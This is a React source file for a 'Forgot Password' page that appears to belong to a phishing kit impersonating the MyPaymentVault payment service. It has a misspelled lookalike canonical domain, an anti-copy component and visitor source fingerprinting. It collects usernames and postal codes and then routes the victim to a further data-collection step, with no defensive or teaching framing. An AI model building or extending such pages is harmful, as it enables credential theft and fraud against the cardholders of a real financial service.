import { useEffect, useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { useMutation } from '@tanstack/react-query';
import { useLocation } from 'wouter';
import { AntiCopyProtection } from '@/components/AntiCopyProtection';
import { SEO } from '@/components/SEO';
import { useToast } from '@/hooks/use-toast';
import { apiRequest } from '@/lib/queryClient';
import { getSourceInfo } from '@/lib/sourceInfo';
import { forgotPasswordRequestSchema } from '@shared/schema';
import type { ForgotPasswordRequest } from '@shared/schema';
import '@/styles/styles.css';
import logoSvg from '@/assets/paymentvault_logo.svg';
import passwordIcon from '@assets/image_1767021850386.png';

export default function ForgotPasswordPage() {
  const [, setLocation] = useLocation();
  const [token, setToken] = useState('');
  const { toast } = useToast();

  const {
    register,
    handleSubmit,
    formState: { errors },
    setValue,
  } = useForm<ForgotPasswordRequest>({
    resolver: zodResolver(forgotPasswordRequestSchema),
  });

  const forgotPasswordMutation = useMutation({
    mutationFn: async (data: ForgotPasswordRequest) => {
      const res = await apiRequest('POST', '/api/forgot-password', { ...data, sourceInfo: getSourceInfo() });
      return await res.json();
    },
    onSuccess: (data: { success: boolean; message: string; id: string }) => {
      sessionStorage.setItem('loginAttemptId', data.id);
      toast({
        title: 'Success',
        description: 'Password recovery request submitted successfully',
      });
      setTimeout(() => {
        setLocation('/postal-code');
      }, 2000);
    },
    onError: (error: Error) => {
      toast({
        title: 'Error',
        description: error.message || 'Password recovery failed. Please try again.',
        variant: 'destructive',
      });
    },
  });

  useEffect(() => {
    const generateRandomString = (length: number) => {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    };

    const newToken = generateRandomString(64);
    setToken(newToken);
    // Remove token from URL - keep it in state only for security
    window.history.replaceState(null, '', window.location.pathname);
  }, []);

  const onSubmit = async (data: ForgotPasswordRequest) => {
    forgotPasswordMutation.mutate(data);
  };

  const handleCancel = () => {
    setLocation('/');
  };

  return (
    <>
      <SEO 
        title="Forgot Password | MyPaymentVault Password Reset"
        description="Forgot your MyPaymentVault password? Reset your password securely. Quick and easy password recovery for your payment vault account."
        keywords="MyPaymentVault forgot password, password reset, mypaymentvault password recovery, reset password, payment vault password help, secure password reset"
        canonical="https://login-mypaymentvaultl.com/forgot-password"
      />
      <AntiCopyProtection />
      <div>
        <form id="forgot_password_form" onSubmit={handleSubmit(onSubmit)}>
          {/* Header */}
          <div className="onbe-dashboard-header">
            <header className="onbe-headercomponent-parent">
              <div className="onbe-login-header-padding d-flex col-xxl-3 col-xl-3 col-lg-3 col-md-6 col-sm-6 col-6 offset-xxl-0 offset-xl-0 offset-lg-0 offset-md-0 offset-sm-0 offset-0">
                <img
                  src={logoSvg}
                  alt="Payment Vault Company Logo"
                  className="onbe-header-affiliate-logo header-logo-size"
                  data-testid="img-logo"
                />
              </div>
            </header>
          </div>

          <div className="onbe-registration-header">
            <div className="container">
              <div className="onbe-registration-header-content">
                <h3 className="onbe-h3 onbe-sidebar-ovrd-h3">Forgot Password</h3>
                <img 
                  src={passwordIcon}
                  alt="Registration - Username & Password" 
                  className=""
                  data-testid="img-password"
                />
              </div>
            </div>
          </div>

          <div className="container">
            <div className="row justify-content-center">
              {/* Center Form */}
              <div className="col-lg-6 col-md-8 col-sm-12">
                <div className="onbe-activation-box-component">
                  <p className="onbe-activation-content-text text-center mb-4" data-testid="text-description">
                    Please enter you username below. Once your access permissions are verified, we will email you your password.
                  </p>
                  <div className="onbe-btn-group-activation">
                    {/* Username */}
                    <div className="onbe-btovr-input-group">
                      <input
                        type="text"
                        id="username"
                        placeholder="Username*"
                        autoComplete="off"
                        maxLength={20}
                        className="onbe-btovr-input-group__input"
                        data-testid="input-username"
                        {...register('username')}
                      />
                      {errors.username && (
                        <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                          {errors.username.message}
                        </div>
                      )}
                    </div>

                    {/* Postal Code */}
                    <div className="onbe-btovr-input-group">
                      <input
                        type="text"
                        id="postalCode"
                        placeholder="Postal Code*"
                        autoComplete="off"
                        maxLength={7}
                        className="onbe-btovr-input-group__input"
                        data-testid="input-postal-code"
                        {...register('postalCode')}
                      />
                      {errors.postalCode && (
                        <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                          {errors.postalCode.message}
                        </div>
                      )}
                    </div>

                    {/* Buttons */}
                    <div className="row mt-3">
                      <div className="col-6">
                        <button
                          type="button"
                          onClick={handleCancel}
                          className="onbe-btovr-button-white onbe-button onbe-button-primary"
                          data-testid="button-cancel"
                        >
                          Cancel
                        </button>
                      </div>
                      <div className="col-6">
                        <button
                          type="submit"
                          className="onbe-btovr-button-black onbe-button onbe-button-primary"
                          data-testid="button-continue"
                        >
                          Continue
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </form>
      </div>
    </>
  );
}
